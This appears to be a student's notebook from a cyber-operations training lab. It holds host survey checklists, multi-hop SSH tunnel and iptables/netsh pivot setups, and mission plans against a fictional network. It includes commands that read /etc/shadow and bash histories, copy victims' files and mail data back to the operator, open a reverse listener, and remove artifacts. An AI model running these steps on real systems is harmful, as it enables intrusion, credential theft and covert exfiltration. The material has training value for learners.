/proc/meminfo<br />cat /etc/shadow<br />cat /etc/passwd<br />lspci -vv<br />arp -a<br />lsusb<br />lsblk<br />fdisk -l<br />free -m<br />dmidecode -t bios<br />#ls -alR / (make sure scrollback limit is set to MAX on terminal)<br /><br /><br /><br /><br /><h3>Survey_&lt;IP_Address&gt;</h3><br />TimeStamp Opnotes Finish<br />Message Analyst<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />T6 Survey Complete. Data in Survey_192.168.117.106. FollowOn value exists as this is an NTP server.<br /><br /><br />Survey Complete. Followon Value reccomended.</div><div class='page'><h1 class='title level-5'>Vetting</h1><br/>On Connect:<br />Message MC<br /><br /><br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp; w<br />ifconfig<br />uname -a<br />cat /etc/*rel*<br />netstat -auntp<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /root<br />sudo ls -latr /var/spool/cron<br />    tail -n 1000 &lt;files in /var/spool/cron/&gt;<br />df<br />sudo ls -latr /var/*acc*<br />sudo ls -latr /var/*log*/<br />sudo ls -latr /var/log/*<br />sudo cat /var/log/* | grep <em>[logged in user account]</em><br />sudo ls -la /etc/*syslog* <em>read </em><em><span style="text-decoration:underline;">all</span></em><em> the config files</em><br />sudo cat /etc/audit/auditd.conf<br />sudo cat /etc/audit/rules.d/audit.rules<br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;;sudo cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />    As needed, examine the files/scripts shown in the directory listing of the cron.* directories<br />sestatus <strong><span style="text-decoration:underline;">OR</span></strong> getenforce<br />sudo cat /root/.bash_history<br />cat ~/.bash_history<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -&lt;<strong>duration since initial connection</strong>&gt; -type f -print0 | xargs -0 ls -latr (NOTE there is a &quot;-&quot; a.k.a minus symbol preceding the &quot;&lt;duration since initial connection&quot;&gt;<br /><br />Before Disconnect:<br />REMOVE ARTIFACTS<br />Update Vet Disco Time Notes<br />Update MC<br />ls -latr /tmp<br />ps -elfH<br />netstat -lptn<br />netstat -natup<br />ls -latr /var/log<br />w<br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -120 -type f -print0 | xargs -0 ls -latr<br />Update Disco Time Notes<br />Message MC<br /></div><div class='page'><h1 class='title level-6'>Pastey</h1><br/>Message MC<br />Edit Highlighted<br /><br /><br />date; date -u<br />whoami &amp;&amp;  id &amp;&amp; w<br />sudo cat /root/.bash_history<br />ifconfig<br />uname -a &amp;&amp; cat /etc/*rel*<br />ls -la /etc/*syslog* <br />netstat -auntp<br />ps -elfH <br />ls -latr /<br />ls -latr /tmp<br />ls -latr .<br />ls -latr ..<br />sudo ls -latr /root<br />sudo ls -latr /var/spool/cron<br />df<br />sudo ls -latr /var/*acc*<br />ls -latr /var/*log*/<br />sudo ls -latr /var/log/*<br />for user in $(cut -f1 -d: /etc/passwd); do echo &quot;###### $user crontab is:&quot;; cat /var/spool/cron/{crontabs/$user,$user} 2&gt;/dev/null; done<br />cat /etc/crontab<br />ls -la /etc/cron.*<br />sestatus<br />getenforce<br />cat ~/.bash_history<br />cat /var/log/* | grep <strong>student14</strong><br />date<br />find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -14 -type f -print0 | xargs -0 ls -latr <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>Windows</h1><br/>Message MC<br /><br />date /t<br />time /t<br />query user<br />tasklist /V<br />auditpol /get /category:*<br />ipconfig /all<br />netstat /anob<br />netstat -napo tcp<br />netsh advfirewall show allprofiles<br />net share<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />at<br />schtasks /query /v<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\<br />dir /o:d /t:w c:\windows\system32<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />dir /o:d /t:w &quot;%appdata%\microsoft\windows\start menu\programs\startup&quot;<br />wevtutil qe security /c:25 /rd:true /f:text <br /><br /><br /><br /><br />On Disconnect:<br />REMOVE ARTIFACTS<br />Update Disco TIme on Notes<br />Message MC<br /><br /><br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />wevtutil qe security /c:25 /rd:true /f:text <br />netstat /anob<br />tasklist -v<br />query user<br /><br /><br />Update Disco Time on Notes<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />wmic process get processid,parentprocessid,executablepath | findstr 1552<br /><br /><br /><br /><br />netsh advfirewall show allprofiles<br />query user<br />tasklist /V<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\</div><div class='page'><h1 class='title level-5'>For Me</h1><br/>schtasks /fo csv | findstr /i ready | findstr /iv N/A<br /><br />gci -path c:\windows\system32 | sort-object LastWriteTime | select-object -Last 10<br /><br />for %F in (*) do @certutil -hashfile &quot;%F&quot; MD5</div><div class='page'><h1 class='title level-5'>Survey</h1><br/>Message MC<br />Ask for permission to load windows managment console. (WMIC)<br />TimeStamp OpNotes Start<br /><br /><br />systeminfo<br />net user<br />net localgroup<br />net session<br />net start<br />type %systemroot%\system32\drivers\etc\hosts<br />arp -a<br />route print<br />driverquery /v<br />wmic baseboard get Manufacturer, Model, PRoduct, SerialNumber, Version<br />wmic cpu get deviceID, Addresswidth, MaxClockSpeed, Name, Manufacturer<br />wmic logicaldisk get name, freespace, systemname, filesystem, size, volumeserialnumber<br />wmic path Win32_VideoController get caption, CurrentHorizontalResolution, CurrentVerticalResolution, Description, DriverVersion, AdapterRAM /format:list<br />wmic printer list full<br />wmic path win32_pnpentity where &quot;ConfigManagerErrorCode&lt;&gt;0&quot; get Name, PNPDeviceID<br />wmic qfe list full<br />wmic service list full<br />wmic product get Caption, InstallDate, Vendor<br />wmic useraccount where &quot;LocalAccount=&#39;TRUE&#39;&quot; get Caption, Disabled, Domain, Lockout, PasswordExpires, SID, Status<br />#tree c:\<br /><br /><br /><br /><br /><br /><h3>Survey_&lt;IP_Address&gt;</h3><br />TimeStamp OpNotes Finish<br />Message Analyst<br />Message MC<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />T7 Survey Complete. Data in Survey_192.168.117.107. FollowOn value exists as This is likley an admnistrators machine.<br /><br /><br />Survey Complete. Followon Value reccomended.<br /><br /><br />:set noswapfile</div><div class='page'><h1 class='title level-5'>Vetting</h1><br/>Message MC<br />On Connection:<br />date /t<br />time /t<br />query user<br />tasklist /V<br />auditpol /get /category:*<br />ipconfig /all<br />netstat /anob<br />netsh advfirewall show allprofiles<br />net share<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />at<br />schtasks /query /v<br />schtasks /fo csv | findstr -i ready<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\<br />dir /o:d /t:w c:\windows\system32<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />dir C:\windows\security\applications<br />dir /o:d /t:w &quot;%appdata%\microsoft\windows\start menu\programs\startup&quot;<br />wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)<br /><br />On Disconnect:<br />REMOVE ARTIFACTS<br />Update Disco TIme on Notes<br />Message MC<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />wevtutil qe security /c:25 /rd:true /f:text <br />netstat /anob<br />tasklist<br />Update Disco Time on Notes<br />Message MC<br /></div><div class='page'><h1 class='title level-6'>Pastey</h1><br/>date /t<br />time /t<br />query user<br />tasklist /V<br />auditpol /get /category:*<br />ipconfig /all<br />netstat /anob<br />netsh advfirewall show allprofiles<br />net share<br />reg query hklm\software\microsoft\windows\currentversion\run<br />reg query hklm\software\microsoft\windows\currentversion\runonce<br />reg query hklm\software<br />at<br />schtasks /query /v<br />dir /o:d /t:w c:\<br />dir /o:d /t:w c:\windows\temp<br />dir /o:d /t:w c:\windows\<br />dir /o:d /t:w c:\windows\system32<br />dir /o:d /t:w c:\windows\system32\winevt\logs<br />dir /o:d /t:w &quot;%appdata%\microsoft\windows\start menu\programs\startup&quot;<br />wevtutil qe security /c:25 /rd:true /f:text <br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />wmic process get processid,parentprocessid,executablepath | findstr 1552</div><div class='page'><h1 class='title level-3'>Tunneling</h1><br/>ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101<br />ssh -S /tmp/t1 dummy@127.0.0.1 (dummy@127.0.0.1 is just a placeholder. does nothing)<br /><br /><br />scp -o ControlPath=/tmp/t1 dummy@127.0.0.1:/home/bob/room/lp.py /root/Desktop/<br /><br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R5157:127.0.0.1:4444<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -R5157:127.0.0.1:4444<br /><br /><br />You will only use Reverse if something is beaconing out of the target and you want to catch it.<br /><br />scp -o ControlPath=/tmp/t5 dummy@127.0.0.1:&quot;\&quot;C:\Users\hugh.payne\My Documents\smbserver notes.rtf\&quot;&quot; .<br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\&quot;&quot; .<br /><br /><br />if you need to sudo...<br />ssh user@ip &quot;cat file&quot; &gt; file.txt<br /><br /><br /><br /><br />scp -o ControlPath=/tmp/t5 -T &#39;student14@127.0.0.1:&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; T5_ADO<br /><br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\*.dll&quot;&quot; .<br /><br />ssh -S /tmp/t6 a &quot;sudo -S cat /etc/shadow&quot; &gt; shadow<br /><br />ssh -p 22 squid@192.168.21.122 -D 127.0.0.1:9050<br /><br /><br /><br /><br /><br /><br /><br /><br /><br />scp -T -r -o ControlPath=/tmp/t5 &#39;dummy@127.0.0.1:&quot;c:\program files (x86)\hmailserver\data\workgroup\*&quot;&#39; .</div><div class='page'><h1 class='title level-4'>Class Notes</h1><br/>-&gt; host1<br />--&gt; host2<br />----&gt; host3<br /><br />host1<br />----------<br />ssh user@host1 -M -S /tmp/host1.sock #Multiplexed<br /><br />ssh user@host1 -S /tmp/host1.sock #Interactive<br /><br />#Create tunnel associated with Multiplexed socket /tmp/host1.sock Kali port 2222 going through host to port 22<br />ssh user@host1 -S /tmp/host1.sock -O forward -L2222:host2:22 # noninteractive<br />ssh user@host1 -S /tmp/host1.sock -L2222:host2:22 # interactive<br /><br />ssh user@host -S /tmp/host1.sock -O forward -R32123:127.0.0.1:4444 # noninteractive REMOTE listener to local nc on 4444<br />nc -lp 4444<br />ssh user@host -S /tmp/host1.sock -O cancel -R32123:127.0.0.1:4444 # noninteractive CLOSE REMOTE listener<br /><br /><br />host2<br />----------<br />ssh user@127.0.0.1 -p 2222 -M -S /tmp/host2.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock # Interactive<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock -L3333:host3:22 # interactive forward tunnel for connecting to next host<br /><br />host3<br />-----------<br />ssh user@127.0.0.1 -p 3333 -M -S /tmp/host3.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 3333 -S /tmp/host3.sock # Interactive</div><div class='page'><h1 class='title level-4'>iptables</h1><br/>lsmod | grep ip_tables<br />lsmod | grep x_tables<br /><br />sudo iptables -L (list rules)<br />sudo iptables -t nat -L<br /><br />sysctl net.ipv4.ip_forward      &lt; check if iprouting is enabled<br />sysctl -w net.ipv4.ip_forward=1     &lt; enable iprouting<br /><br />sudo iptables -L -t nat --line-number<br />sudo iptables -t nat -D POSTROUTING 1<br />sudo iptables -t nat -D PREROUTING 1<br /><br />PREROUTING<br />sudo iptables -t nat -A PREROUTING -p tcp -s 10.50.21.220 --dport 10200 -j DNAT --to-destination 192.168.0.10:22<br /><br />POSTROUTING<br />sudo iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99<br /><br />ssh -M -S /tmp/t2  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10200<br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-5'>Example</h1><br/>T1: ssh -M -S /tmp/t1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 22<br />iptables -t nat -A PREROUTING -p tcp --dport 10200 -j DNAT --to-destination 192.168.0.10:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.10:10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.10:10400<br /><br />iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99<br /><br /><br />T2: ssh -M -S /tmp/t2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10200<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.23:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:10400<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.99 -p tcp -j SNAT --to-source 192.168.0.10<br /><br /><br />T3:  ssh -M -S /tmp/t3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:22<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23<br /><br /><br />T4: ssh -M -S /tmp/t4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10400<br /><br /><br />kali:10.50.21.220<br />&gt;T1: 10.50.30.20 / 192.168.0.99<br />-&gt; T2: 192.168.0.10<br />--&gt; T3: 192.168.0.23<br />---&gt; T4: 192.168.0.13</div><div class='page'><h1 class='title level-4'>netsh</h1><br/>#Must be admin to use netsh<br />#View current port proxies<br />netsh interface portproxy show all<br /><br />#Create a portproxy<br />netsh interface portproxy set v4tov4 listenport=3232 connectaddress=github.com connectport=443 protocol=tcp<br />#could be used to expose internal port#<br /><br />#Verify portproxy is listening<br />netstat -nato | findstr 3232<br /><br />#View portproxy in reg<br />reg query hklm\system\currentcontrolset\services\portproxy /s<br /><br />#Delete a portproxy<br />netsh interface portproxy delete v4tov4 listenport=3232 protocol=tcp<br />netsh interface portproxy delete v4tov4 listenport=10500 listenaddress=192.168.0.9 protocol=TCP<br /><br /><br /><br /><br /><br />netsh interface portproxy delete v4tov4 listenport=10300 listenaddress=192.168.0.12 protocol=TCP</div><div class='page'><h1 class='title level-3'>Missions</h1><br/></div><div class='page'><h1 class='title level-4'>Mystic Marvel 2</h1><br/>ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220 -L10100:10.50.30.20:22 -X  &lt;from host to kali<br /><br /><br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10200:192.168.0.13:22  -L10400:192.168.0.27:22  &lt;to t1<br /><br /><br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -R192.168.0.13:12314:127.0.0.1:12314   &lt; to t2 (recieve t3 via nc)<br />On Kali &gt;&gt; nc -nlvp 12314<br /><br /><br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:192.168.0.23:22 -L 10600:192.168.0.10:22  &lt; to t4 (forward to 5 and 6)<br /><br /><br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1   &lt; to t5<br /><br />ssh -M -S /tmp/t6 -p 10600 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1  &lt; to t6<br /><br /><br /><br /><br />Congrats! You are an 31337 H4x0r!</div><div class='page'><h1 class='title level-4'>Mystic Marvel 3</h1><br/>MYSTICMARVEL03<br />2021/04/21 - 10:38<br />Start Time: ANYTIME<br />Duration: 6 hours<br />MC: mc1<br />Operator: student#<br />Analyst: analyst1<br /><br /><strong>Type of Operation</strong>: Cyber Intelligence, Surveillance and Reconnaissance (C-ISR)<br /><br /><strong>Objective</strong>: Perform enumeration of listed user devices within the Drittes Reich’s internal HYDRA network (192.168.0.1/24).  Of particular interest, record all user accounts for use in follow-on operations. <br /><br /><strong>Tools/Techniques</strong>: All connections will be established through SSH masquerades. Ports in use will be dependent on target location and are subject to change. <br /><br /><em>Credentials: root::&lt;password_you_set&gt; | administrator::&lt;password_you_set&gt; | student#::password#  // **administrators documented to frequently implement default creds on internal routers and various other devices to enable incident response outsourcing </em><br /><br /><strong>Prior Approvals</strong>: sudo is authorized ONLY for commands that require it unless otherwise instructed. <br /><br /><strong>Scheme of Maneuver</strong>: <br />&gt;T1: &lt;Float_IP_of_Box1&gt; / 192.168.0.99<br />-&gt; T2: 192.168.0.10<br />-&gt; T3: 192.168.0.27<br />-&gt; T4: 192.168.0.23<br />-&gt; T5: 192.168.0.13<br /><br /><strong>Target Section</strong>:<br /><br />T1:<br />Hostname: FrankCastle<br />IP: &lt;Float_IP_of_Box1&gt; / 192.168.0.99<br />OS: CentOS 7 <br />Creds: student#::password#<br />Last Known SSH Port: &lt;ssh port you chose&gt;<br />PSP: Unknown<br />Malware: Unknown <br />Implant: None<br />Action: Perform SSH masquerade, enumerate, and redirect to T2 - T5.<br /><br />T2:<br />Hostname: Unknown<br />IP: 192.168.0.10<br />OS: Linux v. unknown <br />Creds: student#::password#<br />Last Known SSH Port: &lt;ssh port you chose&gt;<br />PSP: Unknown<br />Malware: Unknown <br />Implant: None<br />Action: Perform SSH masquerade and enumerate.<br /><br />T3:<br />Hostname: Unknown<br />IP: 192.168.0.27<br />OS: Linux v. unknown  <br />Creds: student#::password#<br />Last Known SSH Port: &lt;ssh port you chose&gt;<br />PSP: Unknown<br />Malware: Unknown <br />Implant: None<br />Action: Perform SSH masquerade and enumerate.<br /><br />T4:<br />Hostname: Unknown<br />IP: 192.168.0.23<br />OS: Linux v. unknown <br />Creds: student#::password#<br />Last Known SSH Port: &lt;ssh port you chose&gt;<br />PSP: Unknown<br />Malware: Unknown <br />Implant: None<br />Action: Perform SSH masquerade and enumerate.<br /><br />T5:<br />Hostname: Unknown<br />IP: 192.168.0.13<br />OS: Linux v. unknown  <br />Creds: student#::password#<br />Last Known SSH Port: &lt;ssh port you chose&gt;<br />PSP: Unknown<br />Malware: Unknown <br />Implant: None<br />Action: Perform SSH masquerade, enumerate, and conclude operation.<br /><br /><br /></div><div class='page'><h1 class='title level-5'>Tunnels</h1><br/>To T1 and forward to all others--<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.10:22 -L10300:192.168.0.27:22 -L10400:192.168.0.23:22 -L10500:192.168.0.13:22<br />ssh -S /tmp/t1 dum@127.0.0.1<br /><br />t2<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br />t3<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t3 dum@127.0.0.1<br /><br />t4<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br /><br />t5<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br /><br />password14</div><div class='page'><h1 class='title level-4'>Mystic Marvel 4</h1><br/></div><div class='page'><h1 class='title level-5'>tunnels</h1><br/>password14<br /><br /><br />To Kali:<br />ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220<br />ssh -S /tmp/t0 dum@127.0.0.1<br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.23:22 <br />ssh -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3 and T5)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:192.168.0.10:22 -L10500:192.168.0.27:22 <br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.168.0.13:22<br />ssh -S /tmp/t3 dum@127.0.0.1<br /><br />To T4:<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br /><br />To T5:<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1</div><div class='page'><h1 class='title level-4'>Mystic Marvel 5</h1><br/>Map<br />10=TonyStark=Debian<br />13=MattMurdock=Ubuntu<br />99=jump=CentOS7<br /><br /><br />9 windows<br />12 windows<br />23 Centos<br />27 fedora</div><div class='page'><h1 class='title level-5'>tunnels</h1><br/>To Kali:<br />ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220<br />ssh -S /tmp/t0 dum@127.0.0.1<br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.13:22 <br />ssh -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:192.168.0.10:22<br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -D 9050<br />ssh -S /tmp/t3 dum@127.0.0.1<br /><br /><br /><br /><br /><br /><br /><br /><br />To T4:<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t4 dum@127.0.0.1<br /><br />To T5:<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br /><br /><br /><br /><br /><br /><br />password14</div><div class='page'><h1 class='title level-4'>Mystic Marvel 6</h1><br/>T1: ssh -M -S /tmp/t1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 22<br />iptables -t nat -A PREROUTING -p tcp --dport 10200 -j DNAT --to-destination 192.168.0.10:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.10:10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.10:10400<br /><br />iptables -t nat -A POSTROUTING -s 10.50.21.220 -p tcp -j SNAT --to-source 192.168.0.99<br /><br /><br />T2: ssh -M -S /tmp/t2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10200<br />iptables -t nat -A PREROUTING -p tcp --dport 10300 -j DNAT --to-destination 192.168.0.23:22<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.23:10400<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.99 -p tcp -j SNAT --to-source 192.168.0.10<br /><br /><br />T3:  ssh -M -S /tmp/t3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10300<br />iptables -t nat -A PREROUTING -p tcp --dport 10400 -j DNAT --to-destination 192.168.0.13:22<br /><br />iptables -t nat -A POSTROUTING -s 192.168.0.10 -p tcp -j SNAT --to-source 192.168.0.23<br /><br /><br />T4: ssh -M -S /tmp/t4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -p 10400<br /><br /><br />kali:10.50.21.220<br />&gt;T1: 10.50.30.20 / 192.168.0.99<br />-&gt; T2: 192.168.0.10<br />--&gt; T3: 192.168.0.23<br />---&gt; T4: 192.168.0.13<br /><br />lsmod | grep ip_tables<br />lsmod | grep x_tables<br /><br />iptables -L (list rules)<br />iptables -t nat -L<br /><br />sysctl net.ipv4.ip_forward      &lt; check if iprouting is enabled<br />sysctl -w net.ipv4.ip_forward=1     &lt; enable iprouting<br /><br />iptables -L -t nat --line-number<br />sudo iptables -t nat -D POSTROUTING 1<br />sudo iptables -t nat -D PREROUTING 1</div><div class='page'><h1 class='title level-4'>WinEnum</h1><br/>ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10200:192.068.0.9:22 -L192.168.0.12:22<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br /><br /><br />wmic os get Caption<br />wmic os get osarchitecture</div><div class='page'><h1 class='title level-5'>9</h1><br/></div><div class='page'><h1 class='title level-5'>12</h1><br/>wmic os get Caption</div><div class='page'><h1 class='title level-4'>Mystic Marvel 7</h1><br/></div><div class='page'><h1 class='title level-5'>tunnels</h1><br/>To Kali:<br />ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220<br />ssh -S /tmp/t0 dum@127.0.0.1<br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.27:22 <br />ssh -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10300:192.168.0.13:22<br />ssh -S /tmp/t2 dum@127.0.0.1<br /><br />To T3: (forward to T4)<br />ssh -M -S /tmp/t3 -p 10300 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10400:192.168.0.9:22<br />ssh -S /tmp/t3 dum@127.0.0.1<br /><br />To T4:<br />ssh -M -S /tmp/t4 -p 10400 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -L10500:192.168.0.12:22<br />ssh -S /tmp/t4 dum@127.0.0.1<br /><br />To T5:<br />ssh -M -S /tmp/t5 -p 10500 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1<br />ssh -S /tmp/t5 dum@127.0.0.1<br /><br /><br /><br /><br /><br /><br />password14</div><div class='page'><h1 class='title level-4'>Pit</h1><br/></div><div class='page'><h1 class='title level-4'>Mystic Marvel 8</h1><br/>&gt;T1: &lt;Float_IP_of_Box1&gt; / 192.168.0.99    Get there (ssh tunnel), survey<br />    -&gt;T2: 192.168.0.12                                Get there (ssh tunnel), Survey, Scan internal network (find other open boxes and scan for open ssh), record findings, Collect all files in prefetch, Netsh for next box<br />        --&gt;T3:192.168.0.13                            Get there (ssh tunnel), Survey<br />      ⇒   --&gt;T4:192.168.0.9                           Get There (ssh tunnel) Survey, Collect All files in Prefetch. Netsh for next box<br />                ----&gt;T5:192.168.0.10                   Get There (ssh tunnel) Survey, Conclude mission<br /><br /><br /><br /><br />To Kali:<br />ssh -M -S /tmp/t0 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@10.50.21.220<br />ssh -S /tmp/t0 dum@127.0.0.1<br /><br />To T1: (forward to T2)<br />ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.30.20 -L10200:192.168.0.12:22 -L10300:192.168.0.12:10300<br />ssh -S /tmp/t1 dum@127.0.0.1<br /><br />To T2: (forward to T3)<br />ssh -M -S /tmp/t2 -p 10200 -o StrictHostKeyChecking=no 